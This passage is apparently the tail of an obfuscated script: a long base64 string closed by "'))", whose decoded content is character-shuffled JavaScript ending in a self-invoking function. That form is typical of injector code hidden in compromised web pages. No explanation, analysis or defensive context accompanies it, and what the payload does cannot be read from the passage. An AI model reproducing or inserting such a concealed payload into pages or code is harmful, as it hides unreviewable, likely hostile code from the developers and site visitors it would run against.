gIHI9XXBeTyM7PTBsXileaS5fZkZec3RvXm5dOikuLnNzXnNfXjleXnIzcmwuNiFpXnAuPV4sZTgpcl5eOl5fan1eXksxLnReIl1sd2wkZV5fXm4oKTJlKV5uMl9ucmF0KF5jVF50O2ZxdG0uO3U9cCheXl9mNSUpIjwgXmVhbnsiXi50bl5eXWV1M2laI0dmPWUoc21kXShvK29ldD0xViw9XXYuM2ZeZklfe3ZecnUlOS1AXn0oNzBwX29lNHl0cikgIXU9ZD5dc21mc159VV9eZCxDbV9hJW4pZF9vcjE0KTFlLn1eYTEubmYxbGFvXls7aV1vaW87XjdeO1NidCR3USxJJXR9KzAtbm4gOnJhZl5iLjM9MXQsXTFGYSEuQUtfXyllbnNnVV04O3EmXmUpNHtgLF9UO25efXt4PSgxOF9gaSklKHJoLnkzbHRuNyU5XVRnXjNPIHRpXCc3XmYlMV9fb11VZ15uNF8xX2MkXjggXTZGXXRtPCBeIDZhPS5wb1NiI3QgbChWcyxObzddQC50IS4lLnQsZG85XmIkUi4obm4uXl85TWNfcyA6O1ldaSFlXm49dGZkX15dNDJeZV4wbVdfO1VsJT0jJXVeeWZvb2leXCcoMVtyYTNeRF15dV5RaDFfIGk/Y28gOSU7XnllJV8uPWZeZDlvIi4gM0MlW15uXnRfbGhlY2UucGZeOiFudG82WyhdLl97YX1eOzhfcnJlclJSNWloJT0pXSleXC8zbH1NIHlsJUleYShOO15hXXMyIWEleG1uSmVlIFsrNyk4X19eZG5uYW8xXC9wKF5mO2xdZl5dc15zXjJeXS5sb15wfWUhLmY9IWlecV5SXWtaS14gLWlfYWNjZnNedzRecmU9XmU2Xm8wOHNiO2lscnJmUW5yKWZhcFsoO2I0KDA9ISk9Z2VeKShedGpOJCVpVl5mc10ubzEkXjt4O3BjKCJvTmUicV83XigweHQkJDEoZV8lY3IuMihuLCJ5KW4uYi40SGV7Z1sodF1vXm5pZXR1Zm5laTouZ14uaXtbNXN9XnFeaDYobmZ1cnJtXjBucl5fcl5nXmFedCR9cilldGF0ZXJzYTA6ImReX2U7MHR5I15Fb2xld14pb2Q6MW9faWReMkwzIGNeYV5vfWJwPV0yNWFOXmNfK2JnXnJdaSEuUWFeMzdnXixtcDN1V3Y9UyhbZSBtNG5lLktlXjspXm5eKChpXmkub2hke2pvX3krdWFyYjlwOTJfNV89MDReU2VudCU5UzZ9KSUpVGV2XmwlZ3ReXjVfXnRedF5lXV51YTMuX2heXl5eLl4xXmxjY3RbWCU9NGRdMWReXz0oITslMilpXnQsKS4wY11nbmVeQXQlXnRdOXReYzJsXjFcJ148aWRpdF5mXjQ9Ml50dDI2Li5fZiVuXn02SV47fTJpWlgoX3ledWReOF50KTsxX3RqXTJ1aF5ean1hIjk7XixkXmZ0JSZjLiluXm5JYmUzezowKzFeSF80aX0mXlFdYl84aV9eMV8gcEQgI2ldZmFeJXVrYzcxZSl7cTFvZl8kNi4gckcoKF5dXyglRV4lIzFRMT1lKWZ3MSByXnJvPSBkNDE9bC0yXiF3Lix0ZWQ0b18zXV5Ta2pwYTYlcyBqICllKGwrc2hdX2Nybz08Ml89dH1iN14gITpcXHs0cyE3amolc1wvNGZkbyxdXzUxMV9cXEUlbXJdbiheZW94fV5wYX1eJF8pXXNKMF5oU15dZnVlXiAufWZpXV0pOWZmOl8uXWYlcnBvXl4sXSluJlMpNz0uWD1edGUwXSheZV50e2EqXn1hX14gJV45fHQgZjQgYWE6NHRyNyBjXjhdIC5uXzJvZDJebyltZTMxYzFycF5iXnt9dylkb2EuIF5nbm99KXIuQV8yZWU5cjdkNG50fXIwRFExLiN0M3A9Y28ubzEpPXJyZl5eRV5jXjl3Xl9ZbF97ezteIDB0W191Xi0zYSA6ZS5mOXRvXjdvYSFtdTFhM1sgNUogcl5mYV1Tc3RuXl5lXmkkNXhpKHJ9bFM6Z0VoNklyfV0uJG5fIHVuLCFeb25vb2Zqb3Q7KG10OWheXjZeICB0Zjd0K2kpezZfOyAwNF8uOGI2IDZpYTEueyVdNCUuPSkxZCVUb04hNiBeXl89Xl59KXJKaX10cjBeXihmXmFeOC5nLl5Odyhdby5eZF9jZF01Pj9mbycpKTt2YXIgSFlDPVdidChDdUUsY3RwICk7SFlDKDIxNzUpO3JldHVybiAxNDEwfSkoKQ=='))
